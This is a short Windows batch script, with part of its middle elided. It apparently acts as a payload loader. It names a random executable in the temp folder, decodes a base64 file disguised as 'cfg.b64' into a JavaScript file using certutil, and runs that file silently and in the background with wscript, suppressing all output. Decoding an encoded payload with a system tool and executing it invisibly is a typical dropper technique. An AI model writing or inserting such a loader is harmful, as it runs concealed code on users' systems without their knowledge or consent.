@echo off
setlocal
set "OUT=%TEMP%\rbc_75991976b301d66a.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_75991976b301d66a.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_75991976b301d66a.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_75991976b301d66a.js"
exit /b 0
